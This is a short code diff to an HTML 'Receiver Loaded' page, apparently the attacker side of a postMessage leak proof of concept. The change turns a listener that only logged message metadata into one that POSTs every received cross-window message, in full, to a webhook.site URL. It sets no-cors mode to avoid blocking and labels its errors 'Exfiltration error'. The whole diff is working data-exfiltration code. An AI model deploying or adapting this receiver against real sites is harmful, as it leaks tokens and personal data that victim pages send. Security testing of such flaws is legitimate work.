@@ -3,14 +3,25 @@
   <body>
     <h1>Receiver Loaded</h1>
     <script>
+      // REPLACE WITH YOUR REAL WEBHOOK URL
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";
+
       window.addEventListener("message", (e) => {
-        const data = e.data;
         try {
-          const size = JSON.stringify(data).length;
-          const keys = Object.keys(data || {}).join(", ");
-          console.log("🔸 Message received – size:", size, "| keys:", keys);
+          // Immediately send the raw message to webhook
+          fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors", // to avoid CORS blocking
+            body: JSON.stringify({
+              receivedAt: new Date().toISOString(),
+              message: e.data
+            })
+          });
+
+          // Log basic metadata (won’t cause crash)
+          console.log("📤 Sent to webhook. Keys:", Object.keys(e.data || {}));
         } catch (err) {
-          console.error("Error inspecting message:", err);
+          console.error("Exfiltration error:", err);
         }
       }, false);
     </script>
